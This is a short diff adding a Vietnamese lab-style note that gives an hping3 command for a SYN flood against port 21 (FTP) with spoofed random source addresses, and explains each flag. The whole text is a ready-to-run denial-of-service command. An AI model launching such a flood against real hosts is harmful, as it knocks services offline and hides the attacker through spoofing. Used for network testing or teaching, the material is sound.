@@ -1,0 +1,12 @@
+Sử dụng câu lệnh hping3 để thực hiện kịch bản:
+hping3 -c 1000 -d 120 -S -w 64 -p 21 --flood --rand-source <ip-target>
+
+Lệnh hping3 có các tham số sau:
+-c 1000: Gửi 1000 gói tin. 
+-d 120: Kích thước dữ liệu mỗi gói là 120 byte. 
+-S: Đặt cờ SYN trong gói tin TCP (mô phỏng kết nối TCP chưa hoàn chỉnh). 
+-w 64: Đặt kích thước cửa sổ TCP là 64. 
+-p 21: Nhắm đến cổng 21 (dịch vụ FTP). 
+--flood: Gửi gói tin nhanh nhất có thể. 
+--rand-source: Sử dụng địa chỉ IP nguồn ngẫu nhiên (spoofing). 
+<ip-target>: Địa chỉ IP đích của mục tiêu.
